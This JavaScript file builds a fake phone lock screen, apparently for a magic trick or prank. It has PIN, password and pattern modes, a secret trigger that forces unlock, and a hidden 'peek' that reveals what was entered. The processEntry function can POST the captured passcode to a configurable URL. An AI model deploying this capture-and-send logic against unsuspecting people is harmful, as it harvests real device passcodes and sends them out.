let attemptCount = 0;
let forceSuccess = false;
let currentInput = "";
let peekData = null;
let lastTapTime = 0;
let holdTimer;
let globalTapCount = 0;
let globalTapTimer;

const config = {
    mode: "pin4",
    successAt: 1,
    peekAt: 1,
    sendAt: 1,
    url: ""
};

window.onload = () => {
    const saved = localStorage.getItem('lockscreen_settings');
    if (saved) {
        const data = JSON.parse(saved);
        Object.assign(config, data);
        document.getElementById('success-try').value = config.successAt;
        document.getElementById('peek-try').value = config.peekAt;
        document.getElementById('send-try').value = config.sendAt;
        document.getElementById('script-url').value = config.url;
        document.querySelectorAll('.chip').forEach(c => c.classList.toggle('active', c.dataset.value === config.mode));
    }
    updateTime();
    setInterval(updateTime, 5000);
};

// Fix 1: Triple tap restricted to dead space
window.addEventListener('touchstart', (e) => {
    if (e.target.closest('button') || e.target.closest('input') || e.target.closest('canvas') || e.target.closest('.chip')) {
        return; 
    }
    globalTapCount++;
    clearTimeout(globalTapTimer);
    globalTapTimer = setTimeout(() => { globalTapCount = 0; }, 500);
    if (globalTapCount === 3) location.reload(); 
});

document.querySelectorAll('.chip').forEach(chip => {
    chip.addEventListener('click', () => {
        document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        config.mode = chip.dataset.value;
    });
});

document.getElementById('start-app').addEventListener('click', () => {
    config.successAt = parseInt(document.getElementById('success-try').value) || 1;
    config.peekAt = parseInt(document.getElementById('peek-try').value) || 1;
    config.sendAt = parseInt(document.getElementById('send-try').value) || 1;
    config.url = document.getElementById('script-url').value;
    localStorage.setItem('lockscreen_settings', JSON.stringify(config));
    document.getElementById('setup-page').classList.add('hidden');
    document.getElementById('lock-page').classList.remove('hidden');
    initLockMode();
});

function initLockMode() {
    ['pin-dots', 'pin-pad', 'password-tap-zone', 'pattern-canvas'].forEach(id => document.getElementById(id).classList.add('hidden'));
    if (config.mode.startsWith('pin')) {
        const dots = config.mode === 'pin4' ? 4 : 6;
        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dots);
        document.getElementById('pin-dots').classList.remove('hidden');
        document.getElementById('pin-pad').classList.remove('hidden');
    } else if (config.mode === 'password') {
        document.getElementById('password-tap-zone').classList.remove('hidden');
    } else if (config.mode === 'pattern') {
        document.getElementById('pattern-canvas').classList.remove('hidden');
        drawDots(); 
    }
}

// Fix 4: 1s Hold
const triggers = ['secret-trigger-lock', 'secret-trigger-home'];
triggers.forEach(id => {
    const el = document.getElementById(id);
    const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
    el.addEventListener('touchstart', e => {
        const now = Date.now();
        if (now - lastTapTime < 300) {
            forceSuccess = !forceSuccess;
            document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
        }
        lastTapTime = now;
        holdTimer = setTimeout(() => {
            drawPeek(peekEl);
            document.getElementById(peekEl).classList.remove('hidden');
        }, 1000);
    });
    el.addEventListener('touchend', () => { clearTimeout(holdTimer); document.getElementById(peekEl).classList.add('hidden'); });
});

// Fix 6: Enhanced Touch Responsiveness for Pattern
const canvas = document.getElementById('pattern-canvas');
const ctx = canvas.getContext('2d');
const dotsArray = [];
for (let i = 0; i < 3; i++) for (let j = 0; j < 3; j++) dotsArray.push({ x: j * 100 + 50, y: i * 100 + 50, id: i * 3 + j });
let currentPattern = [];

function drawDots() {
    ctx.clearRect(0, 0, 300, 300);
    ctx.strokeStyle = "white"; ctx.lineWidth = 4; ctx.lineCap = "round"; ctx.lineJoin = "round";
    if (currentPattern.length > 0) {
        ctx.beginPath();
        ctx.moveTo(dotsArray[currentPattern[0]].x, dotsArray[currentPattern[0]].y);
        currentPattern.forEach(id => ctx.lineTo(dotsArray[id].x, dotsArray[id].y));
        ctx.stroke();
    }
    dotsArray.forEach(d => {
        ctx.beginPath(); ctx.arc(d.x, d.y, 10, 0, Math.PI*2);
        ctx.fillStyle = currentPattern.includes(d.id) ? "white" : "rgba(255,255,255,0.3)";
        ctx.fill();
    });
}

canvas.addEventListener('touchmove', (e) => {
    e.preventDefault(); // Prevents "stiff" feeling or scrolling while drawing
    const rect = canvas.getBoundingClientRect();
    const touch = e.touches[0];
    const x = touch.clientX - rect.left;
    const y = touch.clientY - rect.top;
    dotsArray.forEach(d => {
        if(Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 35 && !currentPattern.includes(d.id)) {
            currentPattern.push(d.id);
            if(navigator.vibrate) navigator.vibrate(10);
            drawDots();
        }
    });
}, {passive: false});

canvas.addEventListener('touchend', () => {
    if(currentPattern.length > 1) processEntry(currentPattern.join('-'), true);
    currentPattern = []; drawDots();
});

function processEntry(val, isPattern = false) {
    attemptCount++;
    if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
    if (attemptCount === config.sendAt && config.url) fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
    if (attemptCount === config.successAt || forceSuccess) {
        document.getElementById('unlock-sound').play();
        document.getElementById('lock-page').classList.add('hidden');
        document.getElementById('home-page').classList.remove('hidden');
    } else {
        document.getElementById('lock-content').classList.add('shake');
        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
        currentInput = "";
        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
        if(document.getElementById('hidden-pass-input')) document.getElementById('hidden-pass-input').value = "";
    }
}

document.querySelectorAll('.num').forEach(btn => {
    btn.addEventListener('click', () => {
        const val = btn.childNodes[0].textContent.trim();
        currentInput += val;
        const dots = document.querySelectorAll('.dot');
        if (dots[currentInput.length - 1]) dots[currentInput.length - 1].classList.add('filled');
        const limit = config.mode === 'pin4' ? 4 : 6;
        if (currentInput.length === limit) setTimeout(() => processEntry(currentInput), 200);
    });
});

// Fix 5: Clear Pattern Peek with Sharp Arrows
function drawPeek(targetCanvasId) {
    const pCanvas = document.getElementById(targetCanvasId);
    const pCtx = pCanvas.getContext('2d');
    pCtx.clearRect(0, 0, 80, 80);
    if (!peekData) return;
    pCtx.strokeStyle = "white"; pCtx.fillStyle = "white"; pCtx.lineWidth = 2;
    if (Array.isArray(peekData)) {
        pCtx.beginPath();
        peekData.forEach((id, i) => {
            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
            if(i === 0) pCtx.moveTo(x,y); 
            else {
                const prevId = peekData[i-1];
                const px = (prevId % 3) * 20 + 20; const py = Math.floor(prevId / 3) * 20 + 20;
                pCtx.lineTo(x,y);
                const angle = Math.atan2(y - py, x - px);
                const mx = (px + x) / 2; const my = (py + y) / 2;
                pCtx.moveTo(mx, my);
                pCtx.lineTo(mx - 6 * Math.cos(angle - Math.PI / 6), my - 6 * Math.sin(angle - Math.PI / 6));
                pCtx.moveTo(mx, my);
                pCtx.lineTo(mx - 6 * Math.cos(angle + Math.PI / 6), my - 6 * Math.sin(angle + Math.PI / 6));
                pCtx.moveTo(x, y);
            }
        });
        pCtx.stroke();
    } else {
        pCtx.font = "bold 16px Arial"; pCtx.textAlign = "center"; pCtx.fillText(peekData, 40, 45);
    }
}

// Fix 4: 12-hour format
function updateTime() {
    const now = new Date();
    let hours = now.getHours();
    const minutes = now.getMinutes().toString().padStart(2, '0');
    hours = hours % 12 || 12;
    document.querySelector('.clock').innerText = `${hours}:${minutes}`;
}
